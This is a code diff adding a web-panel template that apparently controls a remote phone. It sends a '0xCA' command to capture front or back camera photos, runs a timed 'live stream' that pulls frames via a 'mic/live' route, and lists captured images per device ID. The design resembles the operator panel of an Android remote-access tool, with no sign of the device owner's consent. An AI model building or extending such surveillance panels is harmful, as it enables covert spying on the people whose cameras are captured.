@@ -1,0 +1,136 @@
+<div class="grid grid-cols-1 lg:grid-cols-2 gap-6">
+    <!-- Live Camera -->
+    <div>
+        <h3 class="text-white font-semibold text-lg mb-2">Camera & Video</h3>
+        <p class="text-slate-400 text-sm mb-4">Capture photos and stream live video from the device cameras.</p>
+
+        <div class="glass-bright rounded-xl p-6">
+            <div class="grid grid-cols-2 gap-4 mb-4">
+                <button onclick="takePhoto('front')" class="btn-primary text-sm py-3 flex flex-col items-center gap-2">
+                    <svg class="w-8 h-8" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 9a2 2 0 012-2h.93a2 2 0 001.664-.89l.812-1.22A2 2 0 0110.07 4h3.86a2 2 0 011.664.89l.812 1.22A2 2 0 0018.07 7H19a2 2 0 012 2v9a2 2 0 01-2 2H5a2 2 0 01-2-2V9z"/><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 13a3 3 0 11-6 0 3 3 0 016 0z"/></svg>
+                    Front Camera
+                </button>
+                <button onclick="takePhoto('back')" class="btn-primary text-sm py-3 flex flex-col items-center gap-2">
+                    <svg class="w-8 h-8" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 9a2 2 0 012-2h.93a2 2 0 001.664-.89l.812-1.22A2 2 0 0110.07 4h3.86a2 2 0 011.664.89l.812 1.22A2 2 0 0018.07 7H19a2 2 0 012 2v9a2 2 0 01-2 2H5a2 2 0 01-2-2V9z"/><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 13a3 3 0 11-6 0 3 3 0 016 0z"/></svg>
+                    Back Camera
+                </button>
+            </div>
+
+            <!-- Live Stream Controls -->
+            <div class="glass-bright rounded-lg p-4 mb-4">
+                <h4 class="text-white font-medium text-sm mb-2">Live Video Stream</h4>
+                <div class="flex items-center gap-3 mb-3">
+                    <label class="text-slate-400 text-xs">Camera:</label>
+                    <select id="streamCamera" class="px-2 py-1 text-xs w-28">
+                        <option value="front">Front</option>
+                        <option value="back" selected>Back</option>
+                    </select>
+                    <label class="text-slate-400 text-xs">Interval (ms):</label>
+                    <input type="number" id="streamInterval" value="1000" min="200" max="5000" step="100" class="px-2 py-1 text-xs w-20">
+                </div>
+                <div class="flex gap-2">
+                    <button onclick="startVideoStream()" id="streamBtn" class="btn-success text-xs py-1.5 flex-1">Start Stream</button>
+                    <button onclick="stopVideoStream()" class="btn-danger text-xs py-1.5 flex-1">Stop Stream</button>
+                </div>
+            </div>
+
+            <!-- Camera Preview -->
+            <div class="bg-slate-800/50 rounded-lg h-48 flex items-center justify-center overflow-hidden" id="cameraPreview">
+                <img id="cameraImage" style="display:none; max-width:100%; max-height:100%; object-fit:contain;" />
+                <div id="cameraPlaceholder" class="text-slate-500 text-sm">Camera preview will appear here</div>
+            </div>
+            <p class="text-slate-500 text-xs mt-2" id="cameraStatus">Ready</p>
+        </div>
+    </div>
+
+    <!-- Captured Photos -->
+    <div>
+        <h3 class="text-white font-semibold text-lg mb-2">Captured Photos</h3>
+        <p class="text-slate-400 text-sm mb-4">Recently captured photos from the device.</p>
+        <div class="space-y-2" id="photoList">
+            <% if (typeof pageData !== 'undefined' && pageData.length > 0) { pageData.forEach(function(photo) { %>
+            <div class="glass-bright rounded-lg p-3 flex items-center justify-between">
+                <div class="flex items-center gap-3">
+                    <svg class="w-4 h-4 text-accent-blue" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 16l4.586-4.586a2 2 0 012.828 0L16 16m-2-2l1.586-1.586a2 2 0 012.828 0L20 14m-6-6h.01M6 20h12a2 2 0 002-2V6a2 2 0 00-2-2H6a2 2 0 00-2 2v12a2 2 0 002 2z"/></svg>
+                    <span class="text-white text-sm"><%= photo.path.split('/').pop() %></span>
+                    <span class="text-slate-500 text-xs"><%= new Date(photo.time).toLocaleString('en-GB', {timeZone:'UTC'}) %></span>
+                </div>
+                <a href="<%= photo.path %>" class="btn-ghost text-xs py-1 px-2" target="_blank">View</a>
+            </div>
+            <% }); } else { %>
+            <p class="text-slate-500 text-center py-8">No photos captured yet.</p>
+            <% } %>
+        </div>
+    </div>
+</div>
+
+<script>
+    var videoStreamInterval = null;
+
+    function takePhoto(camera) {
+        var status = document.getElementById('cameraStatus');
+        status.textContent = 'Capturing from ' + camera + ' camera...';
+        status.className = 'text-accent-blue text-xs';
+        sendCommand('0xCA', { camera: camera }, function(error, data) {
+            if (error) {
+                status.textContent = 'Error: ' + error;
+                status.className = 'text-accent-red text-xs';
+                showNotification('#f03434', error);
+            } else {
+                status.textContent = 'Photo captured!';
+                status.className = 'text-accent-green text-xs';
+                showNotification('#2ecc71', 'Photo captured');
+                setTimeout(function() { window.location.reload(); }, 2000);
+            }
+        });
+    }
+
+    function startVideoStream() {
+        var btn = document.getElementById('streamBtn');
+        var status = document.getElementById('cameraStatus');
+        var camera = document.getElementById('streamCamera').value;
+        var interval = parseInt(document.getElementById('streamInterval').value) || 1000;
+
+        btn.disabled = true;
+        btn.textContent = 'Starting...';
+        status.textContent = 'Initializing stream...';
+        status.className = 'text-accent-blue text-xs';
+
+        var lastIdx = 0;
+        videoStreamInterval = setInterval(function() {
+            sendCommand('0xCA', { camera: camera }, function(error, data) {
+                if (!error) {
+                    $.get('/manage/<%= deviceID %>/mic/live/last/' + lastIdx, function(d) {
+                        if (d.files && d.files.length > 0) {
+                            var file = d.files[d.files.length - 1];
+                            lastIdx = file.idx;
+                            var img = document.getElementById('cameraImage');
+                            var ph = document.getElementById('cameraPlaceholder');
+                            img.src = '/manage/<%= deviceID %>/downloads/' + file.url.split('/').pop();
+                            img.style.display = 'block';
+                            ph.style.display = 'none';
+                            status.textContent = 'Streaming... Frame ' + lastIdx;
+                            status.className = 'text-accent-green text-xs';
+                        }
+                    });
+                }
+            });
+        }, interval);
+
+        btn.disabled = true;
+        btn.textContent = 'Streaming...';
+        status.textContent = 'Streaming live video...';
+    }
+
+    function stopVideoStream() {
+        if (videoStreamInterval) {
+            clearInterval(videoStreamInterval);
+            videoStreamInterval = null;
+        }
+        document.getElementById('streamBtn').disabled = false;
+        document.getElementById('streamBtn').textContent = 'Start Stream';
+        document.getElementById('cameraStatus').textContent = 'Stream stopped';
+        document.getElementById('cameraStatus').className = 'text-slate-500 text-xs';
+    }
+</script>
+
